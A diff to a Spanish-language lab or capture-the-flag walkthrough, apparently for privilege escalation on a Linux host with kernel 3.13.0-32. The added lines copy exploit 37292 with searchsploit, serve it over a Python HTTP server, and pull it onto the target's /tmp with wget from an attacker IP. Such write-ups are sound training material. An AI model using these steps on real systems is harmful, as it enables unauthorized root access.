@@ -101,3 +101,22 @@ Versión del kernel: `3.13.0-32`
 searchsploit 3.13.0
 ```
 ![11](https://user-images.githubusercontent.com/75953873/174459391-4ab3d7ee-c30f-4ee0-9e95-76c82dac1e10.png)
+
+Descargar exploit:
+```
+searchsploit -m 37292
+```
+![13](https://user-images.githubusercontent.com/75953873/174459424-5bc7b440-01e0-4331-8597-e7dcc4da51c1.png)
+
+Abrir un servidor local en el puerto 80 con Python3:
+```
+python3 -m http.server 80
+```
+![14](https://user-images.githubusercontent.com/75953873/174459453-de8a70d0-36c7-4238-b8eb-bac90a4a891e.png)
+
+Descargar exploit en el directorio `/tmp`:
+```
+cd /tmp
+wget http://192.168.1.9/37292.c
+```
+![15](https://user-images.githubusercontent.com/75953873/174459492-8ced5d75-6852-4b39-a888-0a9216cf23e8.png)
